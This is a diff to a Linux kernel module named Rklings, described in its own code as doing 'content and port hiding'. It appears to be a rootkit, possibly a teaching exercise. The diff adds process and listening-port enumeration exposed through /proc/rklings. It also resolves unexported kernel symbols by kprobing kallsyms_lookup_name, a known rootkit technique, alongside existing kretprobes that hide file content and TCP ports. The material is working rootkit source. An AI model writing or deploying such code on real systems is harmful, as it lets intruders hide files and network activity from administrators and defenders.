@@ -1,15 +1,18 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/init.h>
 #include <linux/kernel.h>
+#include <linux/kallsyms.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/ptrace.h>
+#include <linux/sched/signal.h>
 #include <linux/seq_file.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <net/inet_sock.h>
 #include <net/sock.h>
+#include <net/tcp.h>
 
 #include "target_list.h"
 
@@ -19,6 +22,7 @@
 static struct rk_target_list content_targets;
 static struct rk_target_list port_targets;
 static struct proc_dir_entry *proc_entry;
+static struct inet_hashinfo *rk_tcp_hashinfo;
 
 /* --- vfs_read content hiding --- */
 
@@ -142,6 +146,43 @@ static struct kretprobe tcp_probe = {
 	.maxactive = 8,
 };
 
+/* --- kernel-space enumeration --- */
+
+static void rk_show_processes(struct seq_file *out)
+{
+	struct task_struct *p;
+
+	seq_puts(out, "processes:\n");
+	rcu_read_lock();
+	for_each_process(p)
+		seq_printf(out, "  %u %u %s\n",
+			   task_pid_nr(p), __kuid_val(task_uid(p)), p->comm);
+	rcu_read_unlock();
+}
+
+static void rk_show_ports(struct seq_file *out)
+{
+	struct inet_hashinfo *hinfo = rk_tcp_hashinfo;
+	struct inet_listen_hashbucket *ilb;
+	struct hlist_nulls_node *node;
+	struct sock *sk;
+	unsigned int bucket;
+
+	seq_puts(out, "listening_ports:\n");
+	for (bucket = 0; bucket <= hinfo->lhash2_mask; bucket++) {
+		ilb = &hinfo->lhash2[bucket];
+		spin_lock_bh(&ilb->lock);
+		sk_nulls_for_each(sk, node, &ilb->nulls_head) {
+			struct inet_sock *inet = inet_sk(sk);
+
+			seq_printf(out, "  %u %pI4\n",
+				   ntohs(inet->inet_sport),
+				   &inet->inet_rcv_saddr);
+		}
+		spin_unlock_bh(&ilb->lock);
+	}
+}
+
 /* --- /proc/rklings interface --- */
 
 static int rk_show(struct seq_file *out, void *unused)
@@ -160,6 +201,9 @@ static int rk_show(struct seq_file *out, void *unused)
 	for (i = 0; i < port_targets.count; i++)
 		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
 	spin_unlock_irqrestore(&port_targets.lock, flags);
+
+	rk_show_processes(out);
+	rk_show_ports(out);
 	return 0;
 }
 
@@ -222,10 +266,22 @@ static const struct proc_ops rk_proc_ops = {
 
 static int __init rk_init(void)
 {
+	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
+	typeof(&kallsyms_lookup_name) lookup;
 	int error;
 
 	rk_target_list_init(&content_targets);
 	rk_target_list_init(&port_targets);
+
+	error = register_kprobe(&kp);
+	if (error)
+		return error;
+	lookup = (typeof(lookup))kp.addr;
+	unregister_kprobe(&kp);
+
+	rk_tcp_hashinfo = (struct inet_hashinfo *)lookup("tcp_hashinfo");
+	if (!rk_tcp_hashinfo)
+		return -ENOENT;
 
 	error = register_kretprobe(&read_probe);
 	if (error)
@@ -259,4 +315,4 @@ static void __exit rk_exit(void)
 module_init(rk_init);
 module_exit(rk_exit);
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rklings content and port hiding");
+MODULE_DESCRIPTION("Rklings content/port hiding and kernel enumeration");
